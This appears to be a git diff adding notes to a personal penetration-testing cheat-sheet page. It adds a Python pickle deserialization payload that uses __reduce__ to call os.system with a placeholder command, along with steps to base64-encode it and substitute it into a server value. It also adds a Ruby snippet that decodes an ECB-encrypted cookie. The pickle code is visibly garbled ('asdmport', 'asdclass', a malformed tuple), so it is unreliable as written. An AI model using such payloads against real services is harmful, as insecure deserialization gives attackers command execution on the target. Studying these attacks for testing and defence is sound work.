@@ -98,5 +98,49 @@ toc_sticky: true
 
 </fieldset>
 
+<h2>serialization</h2>
+<h4>Python</h4>
+<p>Pickle</p>
+
+<fieldset>
+  
+  <legend>Python Serialization</legend>
+  <pre><code>
+    asdmport cPickle
+    asdmport os
+    
+    asdclass Blah(object):
+      def __reduce__(self):
+        return (os.system,('command'.))'
+    
+    
+    b = Blah()
+    print cPickle.dumps(b)
+    
+
+</fieldset>
+
+<li>run script</li>
+<li>base64 encode result</li>
+<li>replace server thingy</li>
+
+
+
+
+<h2>ECB Vuln</h2>
+
+<fieldset>
+  
+  <legend>ECB ruby to decode</legend>
+  <pre><code>
+% irb
+> require 'base64' ; require 'uri'
+ => true
+> Base64.decode64(URI.decode("OR9hcp18%2BC1bChK10NlRRg%3d%3d"))
+ => "9\x1Far\x9D|\xF8-[\n\x12\xB5\xD0\xD9QF"
+    
+
+</fieldset>
+
 
 g0tmilk
